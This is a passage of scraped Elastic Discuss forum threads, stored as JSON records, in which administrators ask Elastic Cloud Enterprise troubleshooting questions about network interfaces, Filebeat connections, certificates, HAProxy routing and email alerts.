    "body": "Currently we have Elastic Cloud Enterprise deployed on five hosts, each of these hosts is equipped with two network interfaces: a 1 Gbps one for management and a 10 Gbps one for production. Both interfaces have IP addresses assigned in different networks. The default gateway goes over the 1 Gbps interface. During the installation of Elastic Cloud Enterprise I set the \"--coordinator-host\" option to the address of the 10 Gbps interface; however we see now that ECE does not utilize the 10 Gbps network and instead communicates over the 1Gbps interfaces. Is there a way to force ECE to bind all of its communication to a specific network interface?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "12c095c6-a3a2-4f9f-9ba4-42bac9f51d54",
    "url": "https://discuss.elastic.co/t/filebeat-unable-to-connect-to-ece/219941",
    "title": "Filebeat unable to connect to ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ntran",
    "date": "February 19, 2020, 10:59am February 26, 2020, 4:20am February 26, 2020, 4:21am February 23, 2020, 1:05pm February 23, 2020, 2:31pm February 24, 2020, 2:12pm February 25, 2020, 4:40am February 25, 2020, 4:43am February 26, 2020, 4:21am February 26, 2020, 4:20am March 11, 2020, 4:20am",
    "body": "Hi all, I have installed filebeat to send logs to a production ECE deployment. Filebeat was installed successfully and I can see it is harvesting files, however, it is unable to ship them to ECE. These are the logs: Feb 19 14:52:49 hrc-ece-centos74 filebeat[47017]: 2020-02-19T14:52:49.148+0400 ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(https://4f02406a0dashdiasd33a23725be1f.dns:9243)): Get https://4f02406a0dashdiasd33a23725be1f.dns:9243: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers) Feb 19 14:52:49 ece-centos74 filebeat[47017]: 2020-02-19T14:52:49.149+0400 INFO pipeline/output.go:93 Attempting to reconnect to backoff(elasticsearch(https://4f02406a0dashdiasd33a23725be1f.dns:9243)) with 75 reconnect attempt(s) Feb 19 14:52:49 ece-centos74 filebeat[47017]: 2020-02-19T14:52:49.149+0400 INFO [publisher] pipeline/retry.go:196 retryer: send unwait-signal to consumer Feb 19 14:52:49 ece-centos74 filebeat[47017]: 2020-02-19T14:52:49.149+0400 INFO [publisher] pipeline/retry.go:198 done Feb 19 14:52:49 ece-centos74 filebeat[47017]: 2020-02-19T14:52:49.149+0400 INFO [publisher] pipeline/retry.go:173 retryer: send wait signal to consumer Feb 19 14:52:49 ece-centos74 filebeat[47017]: 2020-02-19T14:52:49.149+0400 INFO [publisher] pipeline/retry.go:175 done This is my filebeat.yml file ########Filebeat Configuration Example ############### #=========================== Filebeat inputs ============================= filebeat.inputs: - type: log enabled: true paths: - var/log/messages #==================== Elasticsearch template setting ========================== setup.template.settings: index.number_of_shards: 1 #index.codec: best_compression #_source.enabled: false output.elasticsearch.index: \"test-%{[agent.version]}-%{+yyyy.MM.dd}\" setup.template.name: \"test-case\" setup.template.pattern: \"test-*\" #================================ Outputs ===================================== #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"4f02406a0d9a3yfhdsufdsf23725be1f.dns:9243\"] #index: \"test-%{[agent.version]}-%{+yyyy.MM.dd}\" # Protocol - either `http` (default) or `https`. protocol: \"https\" # Authentication credentials - either API key or username/password. #api_key: \"id:api_key\" username: \"elastic\" password: \"changeme\" #----------------------------- Logstash output -------------------------------- #output.logstash: # The Logstash hosts #hosts: [\"localhost:5044\"] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] # Certificate for SSL client authentication #ssl.certificate: \"/etc/pki/client/cert.pem\" # Client Certificate Key #ssl.key: \"/etc/pki/client/cert.key\" Any help is greatly appreciated. Thanks, Nhung",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "6367726d-903d-4761-baec-5c1c3755b31f",
    "url": "https://discuss.elastic.co/t/how-to-setup-aws-generated-ssl-certificate-usage-for-elasticsearch-and-kibana-in-elastic-cloud-enterprise-clusters/219940",
    "title": "How to setup AWS generated SSL certificate usage for Elasticsearch and Kibana in Elastic Cloud Enterprise clusters",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "RamanV",
    "date": "February 19, 2020, 10:57am February 19, 2020, 2:53pm February 20, 2020, 12:29pm February 20, 2020, 3:03pm March 5, 2020, 3:10pm",
    "body": "Hello, I have an SSL certificate from AWS Certificate Manager which is attached for corresponding ports on LoadBalancer, that forwards traffic to Elasticsearch and KIbana in ECE cluster. But SSL connection is not working since Elasticsearch and Kibana have their own SSL certificates by default. How to setup AWS generated SSL certificate usage for Elasticsearch and Kibana in Elastic Cloud Enterprise clusters. Have tried https://www.elastic.co/guide/en/cloud-enterprise/2.4/ece-manage-certificates.html, but it is not working.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "bc3351c6-49e4-4c16-b0a6-e57c6f3ab81c",
    "url": "https://discuss.elastic.co/t/issue-using-role-mapping-api-for-ad-group/219229",
    "title": "Issue using role mapping API for AD Group",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ElasticUser4",
    "date": "February 13, 2020, 2:38pm February 14, 2020, 6:10pm February 14, 2020, 3:02pm February 14, 2020, 6:10pm February 14, 2020, 6:13pm February 28, 2020, 6:13pm",
    "body": "Hello, First, I apologize if this is the wrong section to post in. I was not sure if it should be in stack-security, Elasticsearch, etc. I figured being it was around trying to get this to work on ECE that this would be the correct section. I have successfully implemented Active Directory logins for ECE using the Web GUI/Authentication providers. That was straight forward and worked with out issue. I am now trying to lock down Elasticsearch and Kibana in one of my deployments to use AD as well. I used the User setting overrides for my Elasticsearch instance in my deployment with the X-Pack settings. That seems to work as I am able to use an AD login at the Kibana login screen. But I am getting a \"Forbidden\" message, which is to be expected as no roles have been assigned to my AD group. So I attempted to use the examples found on the \"Create or update role mappings API\" document, but no matter what I have tried I keep getting a \"\"ok\":false,\"message\":\"Unknown deployment.\"\" error. I imagine I have to specify the deployment name somehow to tell the API which deployment this role assignment is for? Thank you in advance for any assistance anyone can provide!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "e543cb88-aaba-4cd0-b9c6-d68814c9cab2",
    "url": "https://discuss.elastic.co/t/ml-node-memory-configuration/219064",
    "title": "ML node memory configuration",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "February 12, 2020, 6:56pm February 12, 2020, 7:35pm February 12, 2020, 7:35pm February 12, 2020, 9:01pm February 26, 2020, 9:01pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "bd29b5f5-ce55-45c7-827b-7a598224ea68",
    "url": "https://discuss.elastic.co/t/haproxy-passthrough-endpoints-for-ece/216695",
    "title": "Haproxy Passthrough Endpoints for ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "balogan",
    "date": "January 27, 2020, 4:14pm January 27, 2020, 5:05pm February 4, 2020, 4:49pm February 4, 2020, 5:43pm February 5, 2020, 2:59pm February 6, 2020, 9:18pm February 7, 2020, 12:57pm February 7, 2020, 3:25pm February 7, 2020, 5:33pm February 7, 2020, 6:11pm February 7, 2020, 7:10pm February 21, 2020, 7:10pm",
    "body": "I'm attempting to setup haproxy to service all endpoints within an ECE deployment. First step with getting wildcard DNS setup is done. The problem is getting the endpoints passed through to the proxy servers. After googling I came up with this for a config but it's not working with attempts to open Kibana, Elasticsearch, or ES logs links in ECE timeout. frontend fe_kib_es bind *:9243 #acl is_wild hdr_dom(host) -m end .vcp-ecelab.mon.vzwops.com acl is_wild hdr_dom(host) -i .vcp-ecelab.mon.vzwops.com #use_backend be_kib_es if is_wild use_backend be_kib_es if { hdr_end(host) -i .vcp-ecelab.mon.vzwops.com } backend be_kib_es mode http cookie WILD_HTTP insert balance source option forwardfor header X-Forwarded-For http-request set-header X-Real-IP %[src] #http-request add-header X-Found-Cluster server ecelab-kib-es-1 eceproxylab-1-southlake.mon.vzwops.com:9200 check verify none server ecelab-kib-es-2 eceproxylab-2-southlake.mon.vzwops.com:9200 check verify none server ecelab-kib-es-3 eceproxylab-3-southlake.mon.vzwops.com:9200 check verify none",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "fd4845c5-9f75-4213-adcd-f6d50dd1e227",
    "url": "https://discuss.elastic.co/t/rollback-configuration-change-after-faillure-in-ece-2-4/217832",
    "title": "Rollback configuration change after faillure in ECE 2.4",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tazikm",
    "date": "February 5, 2020, 9:57am February 6, 2020, 8:44pm February 6, 2020, 9:24pm March 5, 2020, 9:24pm",
    "body": "Hi, I have a deployement in 2 zones, with an instance tiebreaker,instance data master,instance data master eligible and a kibana instance , my deployment was facing Memory issues so to add more memory on it, I used Cloud UI to edit it and add 4G of memory. my issue is that the configuration change failled and now I have a deployment with six instances (old ones and also the replacements ones ) I want just to revert the changes to before adding the memory state in order to get just the three original instances. Please Advice Thank you Kamal.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d9f2b1bb-130c-4a75-96d9-0e34cdaa757b",
    "url": "https://discuss.elastic.co/t/custom-url-for-elastic-search-service/217686",
    "title": "Custom URL for Elastic Search Service",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "AndresL",
    "date": "February 3, 2020, 8:21pm February 3, 2020, 8:35pm February 3, 2020, 8:40pm February 17, 2020, 8:40pm",
    "body": "On elastic search service running on cloud, when will be possible to have another name for kibana? My current deployment is: https://DEPLOYMENT_ID.westeurope.azure.elastic-cloud.com/ will be possible to have a subdomain or change the URL to a human readable name?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "023c0019-1c00-4d3d-9384-214f03470e11",
    "url": "https://discuss.elastic.co/t/ece-certificate-chain-was-invalid/217125",
    "title": "ECE - Certificate chain was invalid",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ntran",
    "date": "January 30, 2020, 8:21am January 30, 2020, 3:30pm February 1, 2020, 3:53pm February 3, 2020, 4:41pm February 3, 2020, 7:50pm February 17, 2020, 7:50pm",
    "body": "Hi all, I am getting this error message when uploading my proxy certificate into ECE: Certificate chain was invalid [Invalid Entry: expected X.509 Certificate As I don't have certificates, I am unable to log into Kibana and Elasticsearch. I am using openssl to generate a self signed certificate which has multiple wildcard common names. Created ssl.conf file with the default common name + alt names openssl genrsa -out private.key 4096 openssl req -new -sha256 -out private.csr -key private.key -config ssl.conf openssl x509 -signkey private.key -in private.csr -req -days 365 -out private.crt ssl.conf file [ req ] default_bits = 4096 distinguished_name = req_distinguished_name req_extensions = req_ext [ req_distinguished_name ] countryName = AE countryName_default = AE stateOrProvinceName = Dubai stateOrProvinceName_default = Dubai localityName = Dubai localityName_default = Dubai organizationName = CompanyName organizationName_default = CompanyName commonName = *.text.example.com commonName_max = 64 commonName_default = *.text.example.com [ req_ext ] subjectAltName = @alt_names [alt_names] DNS.1 = *.text.example.com DNS.2 = *.text1.example.com DNS.3 = *.text2.example.com Any help is greatly appreciated. Thank you, Nhung",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "34ec57ae-2bb1-46ef-9990-80da49c4de99",
    "url": "https://discuss.elastic.co/t/small-baseline-installation-new-deployment/217499",
    "title": "Small Baseline Installation - New Deployment",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ntran",
    "date": "February 1, 2020, 4:00pm February 3, 2020, 7:30pm February 17, 2020, 7:30pm",
    "body": "Hi all, I have recently deployed a small baseline installation with 3.5TB of storage, 128 GB of ram and 16 CPU. Is there any best practice documentation on how I should create a deployment that shares equal resources across the three machines? How many GB of ram per node should be allocated for the data and kibana configuration and why?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "104adac6-9716-451f-8c5b-267289d77e7e",
    "url": "https://discuss.elastic.co/t/ece-on-rhel-8-x/217174",
    "title": "ECE on RHEL 8.x",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "caiossouza",
    "date": "January 30, 2020, 12:00pm January 30, 2020, 6:55pm February 13, 2020, 6:55pm",
    "body": "Hi, I would like to confirm if we can run ECE on RHEL 8.x servers. Reading the Support Matrix (https://www.elastic.co/pt/support/matrix#matrix_os) we can see RHEL 8.X is compatible with some recent components, like beats, but it doesnt refer to ECE or Product and Operating System. Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "26f8a543-f44f-45ac-a2d8-19066f331a9e",
    "url": "https://discuss.elastic.co/t/kibana-status-is-red-security-exception/217021",
    "title": "Kibana status is Red - security_exception",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "January 29, 2020, 6:57pm January 29, 2020, 3:31pm January 29, 2020, 4:15pm January 29, 2020, 4:56pm January 29, 2020, 5:52pm January 29, 2020, 6:01pm January 29, 2020, 6:58pm January 29, 2020, 7:15pm January 29, 2020, 7:18pm February 26, 2020, 7:18pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "0712b94a-4cc3-4252-8e2d-02a75c09be45",
    "url": "https://discuss.elastic.co/t/ece-ip-change/216561",
    "title": "ECE IP Change",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ntran",
    "date": "January 26, 2020, 9:11am January 28, 2020, 8:41am February 10, 2020, 5:07pm",
    "body": "Hi all, I have installed ECE on 3 machines, however, I had to move them to a new network and thus the IPs have changed. ECE is still trying to connect to the old IP addresses. Where do I go to change this? 2020.01.26 08:50:32 LOG3[1]: s_connect: connect XX.XX.XX.XX:12193: No route to host (113) 2020.01.26 08:50:32 LOG3[1]: No more addresses to connect 2020.01.26 08:50:39 LOG3[3]: s_connect: connect XX.XX.XX.XX:12193: Connection refused (111) 2020.01.26 08:50:39 LOG3[3]: No more addresses to connect 2020.01.26 08:50:44 LOG3[2]: s_connect: s_poll_wait XX.XX.XX.XX:12193: TIMEOUTconnect exceeded 2020.01.26 08:50:44 LOG3[2]: No more addresses to connect 2020.01.26 08:50:46 LOG3[5]: s_connect: connect XX.XX.XX.XX:12193: No route to host (113) 2020.01.26 08:50:46 LOG3[5]: No more addresses to connect",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "33e2c97b-380a-4763-aa0a-ce57528a6ca5",
    "url": "https://discuss.elastic.co/t/elastic-ece-dead-master-security-cluster-not-available/216447",
    "title": "Elastic ECE Dead master - Security Cluster Not available",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "January 24, 2020, 2:56pm January 24, 2020, 4:19pm February 7, 2020, 4:19pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "658942f2-6de3-4797-8156-8fdf1d7d5444",
    "url": "https://discuss.elastic.co/t/curator-on-ece-2-4-3/216117",
    "title": "Curator on ECE 2.4.3",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "balogan",
    "date": "January 22, 2020, 6:45pm January 22, 2020, 8:55pm January 23, 2020, 12:18pm February 6, 2020, 12:18pm",
    "body": "In our Elastic Stack environment we've been using Curator successfully, and we're planning on migrating to ECE which I've been building. I've been given direction to get Curator to work in ECE, but what I've been reading about it looks like it runs only in docker containers. Is it possible to get Curator to run in ECE like ILM does by default, or will I have to put up Curator docker containers running along side ECE?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ee92ca91-b905-410e-8bd2-a3b341231fc4",
    "url": "https://discuss.elastic.co/t/azure-hosted-elasticsearch-in-my-vnet/216100",
    "title": "Azure- hosted elasticsearch in my vNet",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "liorg2",
    "date": "January 22, 2020, 4:33pm January 22, 2020, 8:58pm January 23, 2020, 6:56am February 6, 2020, 6:56am",
    "body": "hello , is it possible to use hosted elastic (cloud.elastic.co), but to configure it to run in the same azure vNet? that will reduce data transfer, and will give logstash access to sql server thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "130073a7-9eaf-49c3-8a71-f82e0065dff6",
    "url": "https://discuss.elastic.co/t/ece-elasticsearch-keystore/215901",
    "title": "ECE Elasticsearch Keystore",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "January 21, 2020, 2:57pm January 21, 2020, 3:26pm January 21, 2020, 3:53pm January 21, 2020, 3:59pm January 21, 2020, 4:05pm January 21, 2020, 4:29pm January 21, 2020, 5:09pm February 4, 2020, 5:09pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "646d1d10-9f70-4907-ac22-97b3ce3288e5",
    "url": "https://discuss.elastic.co/t/checking-runner-ip-connectivity-failed/215634",
    "title": "Checking runner ip connectivity... FAILED",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "sasikumar",
    "date": "January 19, 2020, 5:26pm January 19, 2020, 9:55pm January 20, 2020, 3:37am January 21, 2020, 3:35pm January 21, 2020, 4:47pm February 4, 2020, 4:48pm",
    "body": "We have already ECE setup on environment and we are trying to add another to existing ECE setup. While installing ECE on the new host we are getting the below errors. Can't connect $RUNNER_HOST_IP [xx.xx.xx.xx:22000]: Connection refused Could any one help on this ? Host Details: Operating System: RHEL 7 Docker Version :1.13 ECE Version:2.4.2",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "86c0f04b-e7bc-4bd7-8f09-ddda02bd73a0",
    "url": "https://discuss.elastic.co/t/bootstrap-monitoring-process-did-not-exit-as-expected-again/215228",
    "title": "Bootstrap monitoring process did not exit as expected - Again",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "lcarr",
    "date": "January 16, 2020, 12:24am January 16, 2020, 4:05pm January 16, 2020, 4:43pm January 16, 2020, 5:34pm January 16, 2020, 5:33pm January 16, 2020, 6:16pm January 16, 2020, 6:21pm January 17, 2020, 4:25pm January 17, 2020, 4:29pm January 17, 2020, 6:25pm January 31, 2020, 6:32pm",
    "body": "I am asking to reopen this ticket. I need some kind of resolution on how to fix it. I have 7 deployments to do in the next 6 months. I had no issues with doing the install on Centos 7 but when I tried in RHEL 7.5 Maipo - with Docker 1.13 I am getting the error. Could someone please put in the commands for how they fixed it. Also, where does the IP address come into play with the services? Why is it used in the /mnt/data/elastic/xxx.xxx.1.187/services. Is there somewhere in the configuration that I should have made a change so that the IP address is not the point for services. I am asking as one of the errors that shows up when I am not directly in that network, I get a message that it is on the whitelist and I should change it. Any help would be greatly appreciated. Linda Carr",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "d6b232f6-e451-48a8-afc2-8256c280bea0",
    "url": "https://discuss.elastic.co/t/disable-built-in-users/215002",
    "title": "Disable built-in users",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "January 14, 2020, 2:19pm January 14, 2020, 2:45pm January 14, 2020, 3:10pm January 14, 2020, 4:03pm January 14, 2020, 4:10pm January 15, 2020, 1:42pm January 15, 2020, 3:10pm January 15, 2020, 3:35pm January 15, 2020, 4:07pm January 16, 2020, 11:09am January 16, 2020, 2:39pm January 17, 2020, 10:44am January 17, 2020, 2:00pm January 17, 2020, 2:05pm January 17, 2020, 2:44pm January 31, 2020, 2:44pm",
    "body": "",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "5c0fd663-98bc-4d15-af4b-034abd8d0fff",
    "url": "https://discuss.elastic.co/t/json-in-api-to-change-platform-endpoint/215326",
    "title": "JSON in API to Change Platform Endpoint",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "balogan",
    "date": "January 16, 2020, 2:15pm January 16, 2020, 2:43pm January 16, 2020, 5:36pm January 30, 2020, 5:36pm",
    "body": "I'm using the configuration store API to change the platform endpoint and having trouble getting the JSON formatting right. This is the JSON example from the docs. { \"value\" : \"string\" } When I use the API to list the config store it looks like this. { \"values\": [{ \"changed\": false, \"name\": \"https_port\", \"value\": \"9243\" }, { \"changed\": true, \"name\": \"cname\", \"value\": \"prod2\" }] } I've tried a combination of values[1].value with no success.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dcdbdb79-1857-483a-9caa-2ed6fc93a061",
    "url": "https://discuss.elastic.co/t/launch-elasticsearch-really-an-error/215336",
    "title": "Launch Elasticsearch - really an error?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "newKibanaUser",
    "date": "January 16, 2020, 3:03pm January 16, 2020, 4:03pm January 16, 2020, 4:15pm January 16, 2020, 4:37pm January 30, 2020, 4:38pm",
    "body": "Hello - I am getting 401 error while launching elasticsearch as below from my ECE deployment. I am able to add/view indices onto this elasticsearch from my local instance using curl. Is this really an error or what should really happen after clicking on this Launch button? image1197×392 54.9 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e680475a-b50e-4601-8be0-9dd67d04f67b",
    "url": "https://discuss.elastic.co/t/gmail-problems/213467",
    "title": "Gmail problems",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Rob_wylde",
    "date": "December 31, 2019, 7:54pm January 2, 2020, 8:26pm January 2, 2020, 8:26pm January 15, 2020, 5:57pm January 15, 2020, 7:44pm January 16, 2020, 5:50am January 16, 2020, 11:00am January 30, 2020, 11:00am",
    "body": "I'm trying to enable watcher to send email when conditions require an email to be sent. however i'm encounter issues and have been bashing my head against the wall for a while and decided its time to ask for assistance. I'm using an app specific password and i'm 100% confident app security settings in gmail are correct as i'm using this same email address with a different app password to send email from Zabbix and its working. Below are my elastic user setting overrides. I do not think xpack.watcher.enabled is required but i saw it in an example and gave it a try. xpack.watcher.enabled : true xpack.notification.email.account: gmail_account: profile: gmail smtp: auth: true starttls.enable: true host: smtp.gmail.com port: 587 user: donotreply@notimportant.com The password is saved in the key store with the setting name of: xpack.notification.email.account.gmail_account.smtp.secure_password Below is the error i find in the logging-and-metrics instances after i push the \"send test email\" after creating a temporary watcher rule. [2019-12-31T18:33:10,986][ERROR][org.elasticsearch.xpack.watcher.actions.email.ExecutableEmailAction] [instance-0000000005] failed to execute action [inlined/email_1] javax.mail.MessagingException: failed to send email with subject [Watch [asf] has exceeded the threshold] via account [work] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:171) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:163) ~[?:?] at org.elasticsearch.xpack.watcher.actions.email.ExecutableEmailAction.execute(ExecutableEmailAction.java:76) ~[?:?] at org.elasticsearch.xpack.core.watcher.actions.ActionWrapper.execute(ActionWrapper.java:164) [x-pack-core-7.5.1.jar:7.5.1] at org.elasticsearch.xpack.watcher.execution.ExecutionService.executeInner(ExecutionService.java:534) [x-pack-watcher-7.5.1.jar:7.5.1] On the nodes running docker root@ELK-ECE-NODE-4:~# telnet smtp.gmail.com 587 Trying 74.125.20.109... Connected to smtp.gmail.com. Escape character is '^]'. 220 smtp.gmail.com ESMTP c14sm35697244pfn.8 - gsmtp ^] telnet> quit However when i tcpdump on the node while snooping for traffic on 587 i see nothing and the above error does not indicate that it is even trying to make a connection. Any suggestions? Thanks",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "6b7f7706-e9ea-477f-8394-9326ddb6acca",
    "url": "https://discuss.elastic.co/t/suggestion-ece-ansible-role-addition/215285",
    "title": "Suggestion: ECE Ansible Role Addition",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "TWhitehouse",
    "date": "January 16, 2020, 9:47am January 30, 2020, 10:02am",
    "body": "I've used the Ansible role to configure a number of ECE hosts running on RHEL7 I noticed that the docker installation on RHEL7 doesn't include docker-procy, docker-runc, or docker-init (only *-current e.g docker-proxy-current) This causes the script to fail when starting any of the containers. To fix this I added the following ansible code to the install docker script in (ansibledir)/roles/ece/tasks/system/RedHat-7/install_docker.yml which has allowed the install to happen - name: SymLink for docker-runc file: src: \"/usr/libexec/docker/docker-runc-current\" path: \"/usr/libexec/docker/docker-runc\" state: link - name: SymLink for docker-proxy file: src: \"/usr/libexec/docker/docker-proxy-current\" path: \"/usr/libexec/docker/docker-proxy\" state: link - name: SymLink for docker-init file: src: \"/usr/libexec/docker/docker-init-current\" path: \"/usr/libexec/docker/docker-init\" state: link I hope this helps someone and it may be worth considering adding to the ansible file, or at least having a note to ensure people know about this.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "008d9a82-d9fb-4fde-ba70-14377d6dfb49",
    "url": "https://discuss.elastic.co/t/ece-and-monitoring-remote-exporters-indicate-a-possible-misconfiguration-misleading/215128",
    "title": "ECE and monitoring: Remote exporters indicate a possible misconfiguration - misleading",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "January 15, 2020, 12:10pm January 16, 2020, 10:10am January 29, 2020, 4:10pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "51063f8c-1219-46a8-8b92-e456b930be12",
    "url": "https://discuss.elastic.co/t/delegate-access-on-cloud-elastic/214850",
    "title": "Delegate access on cloud.elastic",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "AQ_Amra",
    "date": "January 13, 2020, 2:28pm January 13, 2020, 2:49pm January 14, 2020, 6:18am January 28, 2020, 6:18am",
    "body": "Hi, Is it possible to delegate access to other members of our team on the cloud.elastic console?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b3308f62-5fe3-4099-b745-5d0f99c5c169",
    "url": "https://discuss.elastic.co/t/customizing-kibana-deployment-logos-css-etc/214305",
    "title": "Customizing kibana deployment (logos, css, etc.)",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ebalmeida",
    "date": "January 8, 2020, 9:07pm January 8, 2020, 9:35pm January 8, 2020, 9:56pm January 10, 2020, 1:14am January 13, 2020, 8:21pm January 27, 2020, 8:21pm",
    "body": "Hello team, On a local kibana deployment it's possible (however unwieldy, because version updates) to customize logos and other graphical settings by directly changing the relevant files (svg logos or related css). Is there any way to do it (persistently) on an ECE kibana deployment? Thanks!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "d38ca41d-9a8d-4ed4-a406-044d40c9a859",
    "url": "https://discuss.elastic.co/t/ece-2-4-change-deployement-name-impact/214678",
    "title": "ECE 2.4 change deployement name impact",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tazikm",
    "date": "January 10, 2020, 10:29pm January 10, 2020, 10:42pm January 11, 2020, 12:58am January 25, 2020, 12:57am",
    "body": "Hi, is there any impact if i change the deployement name of my clusters in an ECE 2.4 environnement ? Thank you in advance Kamal",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7840c597-2781-4721-b51d-898b07895002",
    "url": "https://discuss.elastic.co/t/kibana-endpoint-not-passing-through-haproxy-using-shortened-url/213597",
    "title": "Kibana Endpoint not Passing through Haproxy Using Shortened URL",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "balogan",
    "date": "January 2, 2020, 6:39pm January 2, 2020, 6:41pm January 2, 2020, 7:29pm January 2, 2020, 9:57pm January 3, 2020, 3:29pm January 6, 2020, 7:26pm January 6, 2020, 7:40pm January 20, 2020, 7:40pm",
    "body": "ECE 2.4.3 Haproxy 1.8 Kibana/Elasticsearch 7.5.4 I can get to Kibana using the endpoint prepended to the domain name like this: https://708....vcp-ecelab-log.mon.vzwops.com But we want a more user friendly url like this: https://vcp-ecelab-log.mon.vzwops.com/kibana Here's the result: {\"ok\":false,\"message\":\"Unknown deployment.\"} Haproxy setup: Frontend: use_backend be_ecelab_log if { hdr(host) -i vcp-ecelab-log.mon.vzwops.com } { path_beg -i /kibana } or { path_beg -i /kibana/ } Backend: backend be_ecelab_log mode http balance source server ecelab-log-1 708.....eceproxylab-1-southlake.mon.vzwops.com:9200 check verify none server ecelab-log-2 708.....eceproxylab-2-southlake.mon.vzwops.com:9200 check verify none server ecelab-log-3 708.....eceproxylab-3-southlake.mon.vzwops.com:9200 check verify none I've tried different combinations of the following on the frontend with no luck: #acl ece_kibana path_beg -i /kibana #redirect location 708.....eceproxylab-1-southlake.mon.vzwops.com append-slash code 301 if ece_kibana #acl ece_kibana { hdr(host) -i vcp-ecelab-log.mon.vzwops.com } { path_beg -i /kibana } or { path_beg -i /kibana/ } #http-request set-var(req.kibana_endpoint) req.hdr(host),lower,regsub(.vcp-ecelab-log.mon.vzwops.com$,) if { hdr(host) -i vcp-ecelab-log.mon.vzwops.com } { path_beg -i /kibana } #http-request set-path /%[var(req.rewrite_kibendpoint)]%[path] if { var(req.rewrite_kibendpoint) -m found } #http-request set-header Host vcp-ecelab-log.mon.vzwops.com if { var(req.rewrite_kibendpoint) -m found } #http-request redirect location 708.....eceproxylab-1-southlake.mon.vzwops.com if ece_kibana #http-request redirect code 301 location http://%[url,regsub(^/,/708....,)].%[hdr(host)] if ece_kibana #use_backend be_ecelab_log ece_kibana #redirect prefix 708.....eceproxylab-1-southlake.mon.vzwops.com code 301 if { hdr(host) -i vcp-ecelab-log.mon.vzwops.com }",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "e2d79cde-3605-45d3-85c2-66fd7d66edd8",
    "url": "https://discuss.elastic.co/t/does-elastic-could-run-on-their-own-infrastructure-or-on-other-cloud-service-providers-like-aws-gcp-or-azure/213401",
    "title": "Does Elastic could run on their own infrastructure or on other cloud service providers like AWS, GCP or Azure?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Manjula_Piyumal",
    "date": "December 31, 2019, 1:57am December 31, 2019, 3:51am January 3, 2020, 5:30am January 17, 2020, 5:30am",
    "body": "Hi, I want to understand more about the elastic cloud and how does it works. Is it runs on their on infrastructure or on other cloud service providers? And if it's possible to run on AWS, can I integrate it with my existing AWS account and VPCs. As per the information available, I'm not clear whether they offer both options or not. So appreciate your help on this to clarify. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "841555a9-81e3-46b5-be5c-a16ac54e0317",
    "url": "https://discuss.elastic.co/t/failing-to-restoring-from-snapshot/212978",
    "title": "Failing to restoring from snapshot",
    "category": [
